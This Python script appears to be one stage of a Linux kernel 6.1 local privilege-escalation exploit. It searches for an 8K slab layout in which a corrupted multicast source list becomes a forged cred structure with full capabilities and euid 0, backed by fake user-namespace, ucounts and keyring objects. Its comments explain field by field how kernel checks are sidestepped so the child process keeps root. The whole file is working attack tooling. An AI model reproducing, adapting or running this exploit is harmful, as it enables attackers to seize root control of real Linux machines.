# lay11.py -- relaxed CSP for the uniform psl pattern (mcast port).
#
# Changes vs lay10, all justified from the 6.1 sources:
#   * cred->egid|fsuid must be a huge u64 because the pre-filled pattern cred
#     IS the "node-shaped" object at C that collect_timerqueue iteration 2
#     reads (expires = cred+0x18).  fsuid=0xffffffff gives 0xffffffff00000000
#     (> any cputime sample) and the child fixes fsuid with setfsuid(0)
#     (allowed: euid==0) before probing; exec sets fsuid=euid anyway.
#   * fake user_namespace dropped to the fields that are actually read:
#       - uid_map.nr_extents = 0 and gid_map.nr_extents = 0: every map lookup
#         returns -1 without touching the extent array.  handle_privileged_root
#         then sees root_uid=-1, which is fine: cap_permitted is already ~0.
#       - ns.ucounts (0x210) = 0 ends the rlimit walk after the cred's
#         ucounts.  This ALIASES uid_map.extent[0].count (0x10) -- both 0,
#         so the uid map cannot translate uid 0; getuid() reads 65534.
#       - ns.level (0xe0) = 0: cap_capable compares init's level 0 <= 0 and
#         returns -EPERM before touching ns->parent or ns->owner.
#       - ns.count (0x104) = 0x40000000 so get_user_ns/put_user_ns never free.
#   * no P/Q alias chain: U->ucounts = 0 ends inc/dec_rlimit and
#     is_rlimit_overlimit after one iteration; get_userns_rlimit_max(U) is
#     read but its value is unused when the loop ends.
#   * every dereferenced field must stay inside the 8K slab, so each object
#     carries a span.
import random

WLO, WHI = 0x18, 0xf8
NBLK = 32
SLAB = 0x2000

CRED = [
    (0x00, 8, ('self',)),            # usage = C (also RB_EMPTY_NODE marker)
    (0x08, 8, None),                 # gid|suid: clobbered by the stage-2 erase
    (0x10, 4, None),                 # sgid (the 8-byte compare at C+0x10 is
                                     #  sgid|euid; euid=0 forces mismatch -> the
                                     #  erase writes winner+cred into C+8)
    (0x14, 4, 0),                    # euid 0
    (0x18, 4, 0),                    # egid 0
    (0x1c, 4, 0xffffffff),           # fsuid -1 (iteration-2 expires hi word)
    (0x20, 8, 0),                    # fsgid|securebits
    (0x28, 8, 0xffffffffffffffff),   # cap_inheritable (~0 is harmless: pI'
                                     #  comes from the file at exec; it only
                                     #  has to contain cap_ambient (0) for
                                     #  cap_ambient_invariant_ok(old))
    (0x30, 8, 0xffffffffffffffff),   # cap_permitted
    (0x38, 8, 0xffffffffffffffff),   # cap_effective (keeps euid 0 through exec)
    (0x40, 8, 0xffffffffffffffff),   # cap_bset
    (0x48, 8, 0),                    # cap_ambient
    (0x50, 8, 0),                    # jit_keyring + pad (never read: no
                                     #  request_key() in the chain)
    # CONFIG_KEYS: prepare_creds only key_get()s these (refcount_inc on
    # key->usage at +0), copy_creds/prepare_exec_creds key_put() the
    # process/thread ones, so session/process/request may point at any
    # in-slab object with a big refcount at +0 (user, gi, sec).  The
    # thread keyring is different: key_fsuid_changed()/key_fsgid_changed()
    # (called by commit_creds when fsuid/fsgid change, e.g. the child's
    # setfsuid(0)) do down_write(&thread_keyring->sem) and write ->uid --
    # so thread_keyring MUST stay NULL.
    (0x58, 8, ('addr', 'user')),     # session_keyring
    (0x60, 8, ('addr', 'gi')),       # process_keyring
    (0x68, 8, 0),                    # thread_keyring = NULL (required)
    (0x70, 8, ('addr', 'sec')),      # request_key_auth
    (0x78, 8, ('addr', 'sec')),
    (0x80, 8, ('addr', 'user')),
    (0x88, 8, ('addr', 'ns')),
    (0x90, 8, ('addr', 'ucounts')),
    (0x98, 8, ('addr', 'gi')),
    # 0xa0..0xaf: non_rcu + rcu_head.  Only read by __put_cred(), which never
    # runs on the fake cred (its usage at +0 is its own huge address), so
    # these 16 bytes are left free for chunk-distinctness filler.
]
NS = [
    (0x00, 4, 0),                    # uid_map.nr_extents = 0
    (0x10, 8, 0),                    # extent count / aliases ns.ucounts (0x210)
    (0x48, 4, 0),                    # gid_map.nr_extents = 0
    (0xe0, 4, 0),                    # level = 0 (init level <= 0 -> EPERM)
    (0x104, 4, 0x40000000),          # ns.count (refcount for get/put_user_ns)
    (0x210, 8, 0),                   # ns.ucounts = NULL
]
UC = [
    (0x10, 8, ('addr', 'ns')),       # ucounts.ns
    (0x18, 4, ('hi32', 'cred')),     # ucounts.uid
    (0x1c, 4, 0x40000000),           # ucounts.count
    (0x70, 8, 0),                    # rlimit[RLIMIT_NPROC] = 0
]
USER = [(0x00, 4, 0x40000000)]
GI = [(0x00, 4, 0x40000000), (0x04, 4, 0)]
SEC = [(0x00, 4, 0x40000000), (0x04, 4, 0)]   # SELinux task_security_struct
SPAN = {'cred': 0xb0, 'ns': 0x270, 'ucounts': 0x78, 'user': 0x04,
        'gi': 0x08, 'sec': 0x20}
OBJS = {'cred': CRED, 'ns': NS, 'ucounts': UC, 'user': USER, 'gi': GI,
        'sec': SEC}
OTHERS = ['ns', 'ucounts', 'user', 'gi', 'sec']


class Fail(Exception):
    pass


class State:
    __slots__ = ('mem', 'demands', 'addr', 'base', 'forbid')

    def __init__(self, base, forbid):
        self.mem = {}        # residue -> byte
        self.demands = []    # (residue, target, kind, byte_index)
        self.addr = {}
        self.base = base
        self.forbid = forbid

    def copy(self):
        s = State(self.base, self.forbid)
        s.mem = dict(self.mem)
        s.demands = list(self.demands)
        s.addr = dict(self.addr)
        return s

    def place(self, obj, A):
        if A & 7:
            return None
        d = A - self.base
        if d < 0 or d + SPAN[obj] > SLAB:
            return None
        if (d >> 8) in self.forbid:
            return None
        used = set()
        for (off, size, spec) in OBJS[obj]:
            for i in range(size):
                used.add(d + off + i)
        if any((u >> 8) in self.forbid for u in used):
            return None
        s = self.copy()
        adds = {}

        def commit(r, v):
            if r < WLO or r >= WHI:
                raise Fail('residue %#x outside window' % r)
            if r in s.mem:
                if s.mem[r] != v:
                    raise Fail('conflict at %#x' % r)
                return
            if r in adds and adds[r] != v:
                raise Fail('self-conflict at %#x' % r)
            adds[r] = v

        def val_of(spec):
            if isinstance(spec, int):
                return spec
            kind = spec[0]
            if kind == 'self':
                return A
            target = spec[1]
            if target in s.addr:
                B = s.addr[target]
                if kind == 'addr':
                    return B
                if kind == 'low32':
                    return B & 0xffffffff
                if kind == 'hi32':
                    return (B >> 32) & 0xffffffff
            return None

        try:
            for (off, size, spec) in OBJS[obj]:
                if spec is None:
                    continue
                v = val_of(spec)
                for i in range(size):
                    r = (A + off + i) & 0xff
                    if v is not None:
                        commit(r, (v >> (8 * i)) & 0xff)
                    else:
                        if r < WLO or r >= WHI:
                            raise Fail('demand residue %#x' % r)
                        s.demands.append((r, spec[1], spec[0], i))
            keep = []
            for (r, target, kind, bi) in s.demands:
                if target != obj:
                    keep.append((r, target, kind, bi))
                    continue
                if kind == 'addr':
                    v = A
                elif kind == 'low32':
                    v = A & 0xffffffff
                else:
                    v = (A >> 32) & 0xffffffff
                commit(r, (v >> (8 * bi)) & 0xff)
            s.demands = keep
        except Fail:
            return None
        s.mem.update(adds)
        s.addr[obj] = A
        return s


def chunks_of(mem):
    return [bytes(mem.get(WLO + 16 * k + i, 0) for i in range(16))
            for k in range(14)]


FILLER = 0x11


def fill_chunks(mem):
    """BLOCK_SOURCE/UNBLOCK_SOURCE reject duplicate addresses, so the 14
    chunks of the rewritten psl must be pairwise distinct.  Unwritten
    residues are zero, which makes several chunks identical; paint one free
    residue per offending chunk with a unique byte (free = not claimed by
    any object field)."""
    mem = dict(mem)
    seen = set()

    def paint(k, tag):
        for i in range(16):
            r = WLO + 16 * k + i
            if r not in mem:
                mem[r] = (tag + k) & 0xff or 1
                return True
        return False

    for k in range(14):
        ch = bytes(mem.get(WLO + 16 * k + i, 0) for i in range(16))
        if ch == bytes(16) or ch in seen:
            if not paint(k, FILLER):
                return None
            ch = bytes(mem.get(WLO + 16 * k + i, 0) for i in range(16))
        seen.add(ch)
    return mem


def feasible(state, obj, rnd=None):
    out = []
    for b in range(NBLK):
        if b in state.forbid:
            continue
        for p in range(0x00, 0x100, 8):
            s = state.place(obj, state.base + 0x100 * b + p)
            if s is not None:
                out.append((b, p))
    if rnd:
        rnd.shuffle(out)
    return out


def dfs(state, todo, rnd, budget):
    if not todo:
        return state
    best = None
    cand = None
    for obj in todo:
        fs = feasible(state, obj)
        if not fs:
            return None
        if cand is None or len(fs) < len(cand):
            best, cand = obj, fs
    rnd.shuffle(cand)
    for (b, p) in cand[:64]:
        budget[0] -= 1
        if budget[0] < 0:
            return None
        s2 = state.place(best, state.base + 0x100 * b + p)
        if s2 is None:
            continue
        r = dfs(s2, [o for o in todo if o != best], rnd, budget)
        if r is not None:
            return r
    return None


def solve(base, oi, seed=1, budget=400000):
    for bC in range(NBLK):
        if bC == oi:
            continue
        for pC in range(0x00, 0x100, 8):
            C = base + 0x100 * bC + pC
            s = State(base, {oi}).place('cred', C)
            if s is None:
                continue
            s.forbid = {oi, bC}
            rnd = random.Random(seed ^ (bC << 8) ^ pC)
            got = dfs(s, list(OTHERS), rnd, [budget])
            if got is None:
                continue
            mem = fill_chunks(got.mem)
            if mem is None:
                continue
            got.mem = mem
            ch = chunks_of(got.mem)
            if len(set(ch)) != 14 or bytes(16) in ch:
                continue
            return got, (bC, pC)
    return None, None


def dump(st, tag):
    print(tag)
    for o in ['cred'] + OTHERS:
        A = st.addr[o]
        print('  %-8s %#018x  block %2d phase %#04x' %
              (o, A, (A - st.base) >> 8, A & 0xff))
    print('  unresolved demands:', st.demands[:5], len(st.demands))
    print('  chunks distinct:', len(set(chunks_of(st.mem))) == 14)


def main():
    import sys
    base = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0xffffff80036d2000
    oi = int(sys.argv[2], 0) if len(sys.argv) > 2 else 11
    st, info = solve(base, oi)
    if st is None:
        print('NO LAYOUT base=%#x oi=%d' % (base, oi))
        return 1
    dump(st, 'LAYOUT base=%#x oi=%d cred=(%d,%#x)' % (base, oi, info[0], info[1]))
    for i, c in enumerate(chunks_of(st.mem)):
        print('   [%2d] %s' % (i, c.hex()))
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
